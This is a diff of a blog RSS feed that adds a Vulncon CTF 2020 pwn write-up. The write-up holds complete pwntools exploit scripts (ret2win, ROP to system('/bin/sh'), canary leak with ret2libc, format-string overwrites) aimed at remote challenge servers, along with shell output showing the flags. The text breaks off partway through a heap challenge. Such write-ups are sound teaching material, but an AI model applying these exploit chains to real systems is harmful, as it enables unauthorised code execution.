@@ -4,8 +4,483 @@
         <link>/posts/</link>
         <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
         <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Sun, 20 Dec 2020 16:59:57 +0700</lastBuildDate>
+        <lastBuildDate>Sun, 20 Dec 2020 18:43:33 +0700</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Writeup PWN Vulncon CTF 2020</title>
+            <link>/posts/writeup-pwn-vulncon-ctf-2020/</link>
+            <pubDate>Sun, 20 Dec 2020 18:43:33 +0700</pubDate>
+            
+            <guid>/posts/writeup-pwn-vulncon-ctf-2020/</guid>
+            <description>warmup This was obvious ret2win function, since it had a function named overflowed which, once called, return the shell, then using the gdb we find the offset to the RIP was 24, then using pwntools, we get the shell and the flag.
+ Since the remote system was the Ubuntu 18.04 or higher, using a ret we aligned the payload and profit.
+ from pwn import * p = remote(&amp;#34;35.232.11.215&amp;#34;, 49153) elf = ELF(&amp;#34;w4rmup&amp;#34;) payload = b&amp;#34;A&amp;#34;*24 payload += p64(0x0000000000401016) payload += p64(elf.</description>
+            <content type="html"><![CDATA[<h1 id="warmup">warmup</h1>
+<p>This was obvious ret2win function, since it had a function named <code>overflowed</code> which, once called, return the shell, then using the <code>gdb</code> we find the offset to the RIP was 24, then using pwntools, we get the shell and the flag.</p>
+<blockquote>
+<p>Since the remote system was the Ubuntu 18.04 or higher, using a <code>ret</code> we aligned the payload and profit.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;35.232.11.215&#34;</span>, <span style="color:#ae81ff">49153</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;w4rmup&#34;</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000401016</span>)
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;overflowed&#39;</span>])
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div><p>Running it:-</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r">[<span style="color:#f92672">*</span>] Switching to interactive mode
+<span style="color:#ae81ff">-1964922237</span>
+<span style="color:#f92672">$</span> ls
+check
+flag
+run.sh
+ynetd
+<span style="color:#f92672">$</span> cat flag
+vulncon{y0u_4re_all_s3t_for_pwn}
+</code></pre></div><h1 id="name">Name</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+{
+  <span style="color:#66d9ef">char</span> s1; <span style="color:#75715e">// [rsp+0h] [rbp-80h]
+</span><span style="color:#75715e"></span>
+  setvbuf(stdin, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+  setvbuf(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+  setvbuf(stderr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+  alarm(<span style="color:#ae81ff">0x14u</span>);
+  system(<span style="color:#e6db74">&#34;echo -n &#39;Enter your name: &#39;&#34;</span>);
+  gets(<span style="color:#f92672">&amp;</span>s1, <span style="color:#ae81ff">0LL</span>);
+  <span style="color:#66d9ef">if</span> ( strcmp(<span style="color:#f92672">&amp;</span>s1, <span style="color:#e6db74">&#34;w3lc0m3&#34;</span>) )
+    exit(<span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+}
+</code></pre></div><p>We know gets not filter limit input, show we can overwrite the ret address and do system(“/bin/sh”). In order to bypass strcmp we can use “\x00”. But we need string “/bin/sh”.
+so our plant :</p>
+<ul>
+<li>overwrite address with call gets on bss and write &ldquo;/bin/sh&rdquo;</li>
+<li>call system with rdi bss so we can call system(“/bin/sh”)</li>
+</ul>
+<p>explot script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#75715e">#MyTemplate</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./name&#34;</span>)
+
+lokal <span style="color:#f92672">=</span> False
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+<span style="color:#75715e">#context.arch = &#39;&#39;</span>
+
+s    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :xp<span style="color:#f92672">.</span>send(data)
+sa   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendafter(delim,data)
+sl   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :xp<span style="color:#f92672">.</span>sendline(data)
+sla  <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendlineafter(delim,data)
+r    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :xp<span style="color:#f92672">.</span>recv(numb)
+ru   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span>True  :xp<span style="color:#f92672">.</span>recvuntil(delims, drop)
+uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        Debug <span style="color:#f92672">=</span> True
+<span style="color:#66d9ef">else</span>:
+        Debug <span style="color:#f92672">=</span> False
+
+<span style="color:#66d9ef">if</span> lokal:
+    xp <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path])
+<span style="color:#66d9ef">else</span>:
+    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;13.233.134.24&#39;</span>
+    port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;49153&#39;</span>
+    xp <span style="color:#f92672">=</span> remote(host,port)
+
+<span style="color:#66d9ef">if</span> Debug:
+    context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;b *0x4007a5 </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> c&#34;</span>
+    gdb<span style="color:#f92672">.</span>attach(xp,cmd)
+
+
+<span style="color:#75715e">#Exploit Here</span>
+pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400833</span>
+p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;w3lc0m3&#34;</span>
+p <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>((<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">17</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>)
+p <span style="color:#f92672">+=</span> p64(pop_rdi)
+p <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>bss())
+p <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;gets&#39;</span>])
+p <span style="color:#f92672">+=</span> p64(pop_rdi)
+p <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>bss())
+p <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;system&#39;</span>])
+sl(p)
+xp<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="/img/vulncon_name.png" alt=""></p>
+<p>Flag : <code>vulncon{wh3r3_d1d_y0u_g3t_b1nsh}</code></p>
+<h1 id="looping">looping</h1>
+<p>From the reverse engineering, we see that the binary takes the input with <code>read</code> and prints the content with the <code>puts</code>, since it is not null terminated, we can give a certain amount of bytes and leak stack contents, using that we get the PIE address and the canary, then ret2libc:-</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;35.232.11.215&#34;</span>, <span style="color:#ae81ff">49154</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;looping&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">73</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">73</span>)
+canary <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> hex(u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>strip()))[<span style="color:#ae81ff">4</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;00&#34;</span>, <span style="color:#ae81ff">16</span>)
+
+elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span>  int(hex(u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;90&#34;</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x990</span>
+<span style="color:#66d9ef">print</span>(hex(canary))
+
+<span style="color:#66d9ef">print</span>(hex(elf<span style="color:#f92672">.</span>address))
+
+pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000000000009f3</span>
+
+payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">72</span>)
+payload <span style="color:#f92672">+=</span> p64(canary)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>])
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>])
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x88a</span>)
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recvline()
+p<span style="color:#f92672">.</span>recvline()
+p<span style="color:#f92672">.</span>recvline()
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
+<span style="color:#66d9ef">print</span>(hex(libc<span style="color:#f92672">.</span>address))
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;&#34;</span>)
+payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">72</span>)
+payload <span style="color:#f92672">+=</span> p64(canary)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4f3d5</span>)
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><pre><code>TryHarder
+$ ls
+flag
+looping
+run.sh
+ynetd
+$ cat f*
+vulncon{w3_d0n7_c4r3_4b0u7_c4n4r13s}
+</code></pre><h1 id="where_to_go">where_to_go</h1>
+<p>This binary had the obvious stack overflow vulnerabiltiy with the <code>NX</code> and <code>PIE</code> enabled, so there was this following function which gives us the address of the <code>main</code> function and call the <code>main</code> again, since the PIE is enabled, we can just do partial overwrite of the <code>ret</code> to call the following function and then we can do obvious re2libc:-</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r">[0x000006d0]<span style="color:#f92672">&gt;</span> pdf <span style="color:#f92672">@</span>fcn.00000899
+<span style="color:#f92672">/</span> <span style="color:#ae81ff">67</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">fcn.00000899 </span>();
+<span style="color:#f92672">|</span>           ; var int64_t var_10h <span style="color:#f92672">@</span> rbp<span style="color:#ae81ff">-0</span>x10
+<span style="color:#f92672">|</span>           ; var int64_t var_8h <span style="color:#f92672">@</span> rbp<span style="color:#ae81ff">-0</span>x8
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x00000899</span>      <span style="color:#ae81ff">55</span>             push rbp
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x0000089a</span>      <span style="color:#ae81ff">4889e5</span>         mov rbp, rsp
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x0000089d</span>      <span style="color:#ae81ff">4883</span>ec10       sub rsp, <span style="color:#ae81ff">0x10</span>
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008a1</span>      <span style="color:#ae81ff">488</span>d0532ffff.  lea rax, qword [main]       ; <span style="color:#ae81ff">0x7da</span>
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008a8</span>      <span style="color:#ae81ff">488945</span>f0       mov qword [var_10h], rax
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008ac</span>      <span style="color:#ae81ff">488</span>d45f0       lea rax, qword [var_10h]
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008b0</span>      <span style="color:#ae81ff">488945</span>f8       mov qword [var_8h], rax
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008b4</span>      <span style="color:#ae81ff">488</span>b45f8       mov rax, qword [var_8h]
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008b8</span>      ba06000000     mov edx, <span style="color:#ae81ff">6</span>
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008bd</span>      <span style="color:#ae81ff">4889</span>c6         mov rsi, rax
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008c0</span>      bf01000000     mov edi, <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008c5</span>      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008ca</span>      e8b1fdffff     call sym.imp.write          ; ssize_t <span style="color:#a6e22e">write</span>(int fd, const char <span style="color:#f92672">*</span>ptr, size_t nbytes)
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008cf</span>      b800000000     mov eax, <span style="color:#ae81ff">0</span>
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008d4</span>      e801ffffff     call main                   ; int <span style="color:#a6e22e">main</span>(int argc, char <span style="color:#f92672">**</span>argv, char <span style="color:#f92672">**</span>envp)
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008d9</span>      <span style="color:#ae81ff">90</span>             nop
+<span style="color:#f92672">|</span>           <span style="color:#ae81ff">0x000008da</span>      c9             leave
+\           <span style="color:#ae81ff">0x000008db</span>      c3             ret
+
+</code></pre></div><p>The exploit:-</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;35.232.11.215&#34;</span>, <span style="color:#ae81ff">49155</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;where_to_go&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc6_2.27-3ubuntu1.4_amd64.so&#34;</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span>
+pause()
+p<span style="color:#f92672">.</span>recvline()
+p<span style="color:#f92672">.</span>send(payload)
+elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7da</span>
+
+mov <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x920</span>
+pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x943</span>
+pop_rsi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x941</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+payload <span style="color:#f92672">+=</span> p64(pop_rsi)
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;write&#39;</span>])
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>])
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7da</span>)
+pause()
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>recvline()
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;write&#39;</span>]
+<span style="color:#66d9ef">print</span>(hex(libc<span style="color:#f92672">.</span>address))
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000288</span>)
+payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)))
+payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>])
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><pre><code>$ ls
+flag
+run.sh
+where_to_go
+ynetd
+$ cat f*
+vulncon{4s1r_4nd_p13_c4n7_s70p_us}
+</code></pre><h1 id="nobin">nobin</h1>
+<p>This challenge was the blind format string challenge which can be deduced by giving the <code>%p</code> to the remote server and the response was an arbitrary address from the binary of the server side. Since, judging from the output of the fuzzing parameter i.e. <code>%p%p%p%p</code>, so using the following leaker, I leaked the binary up until to the <code>text</code> segment.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> binascii
+
+RPORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">49156</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000</span>
+leaked <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+    chal <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;34.91.74.119&#34;</span>, RPORT)
+    addr <span style="color:#f92672">=</span> p64(base<span style="color:#f92672">+</span>len(leaked))
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> addr:
+        leaked <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;derp&#34;</span>)
+        <span style="color:#66d9ef">continue</span>
+    chal<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%8$s&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> addr)
+    chal<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>)
+    leak <span style="color:#f92672">=</span> chal<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">6</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]
+    leaked <span style="color:#f92672">+=</span> leak <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
+    chal<span style="color:#f92672">.</span>close()
+    <span style="color:#66d9ef">print</span>(leak)
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Length:  </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>(len(leaked)))
+    l <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;leak.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
+    l<span style="color:#f92672">.</span>write(leaked)
+    l<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Analysing the <code>leaks.bin</code> with <code>r2</code> we can see there is an another function which spawns a shell if the global address <code>0x601068</code> is equal to the <code>0x1337</code>, so following exploit was used:;-</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> roppy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;34.91.74.119&#34;</span>, <span style="color:#ae81ff">49156</span>)
+payload <span style="color:#f92672">=</span> fmtstr64(<span style="color:#ae81ff">6</span>, {<span style="color:#ae81ff">0x00601048</span>: <span style="color:#ae81ff">0x00400670</span>})
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recv()
+payload <span style="color:#f92672">=</span> fmtstr64(<span style="color:#ae81ff">6</span>, {<span style="color:#ae81ff">0x0060108c</span>: <span style="color:#ae81ff">0x1337</span>})
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recv()
+payload <span style="color:#f92672">=</span> fmtstr64(<span style="color:#ae81ff">6</span>, {<span style="color:#ae81ff">0x00601048</span>: <span style="color:#ae81ff">0x0040081a</span>})
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Resulting in:-</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="color:#f92672">$</span> cat flag
+vulncon{th4nk_y0u_%s_f0r_l34k}
+</code></pre></div><h1 id="the-good-old-time">the Good Old Time</h1>
+<h4 id="main-function">Main function</h4>
+<pre><code>Welcome! Deleted /bin/sh!
+[1] - create
+[2] - edit
+[3] - show
+[4] - delete
+[5] - exit
+</code></pre><h4 id="create-function">Create function</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall sub_141C<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
+{
+  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// ST0C_4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr64 }
+  v3 <span style="color:#f92672">=</span> a1;
+  v1 <span style="color:#f92672">=</span> sub_15DC();
+  sub_1140(<span style="color:#e6db74">&#34;size: &#34;</span>);
+  sub_11A0(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>dword_40E0[v1]);
+  sub_1150(stdin);
+  sub_1140(<span style="color:#e6db74">&#34;input: &#34;</span>);
+  qword_4060[v1] <span style="color:#f92672">=</span> sub_1180(dword_40E0[v1]);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_1170</span>(qword_4060[v1]);
+}
+</code></pre></div><p>It looks like we can input size without limitation</p>
+<h4 id="edit-function">Edit function</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall sub_14F5<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
+{
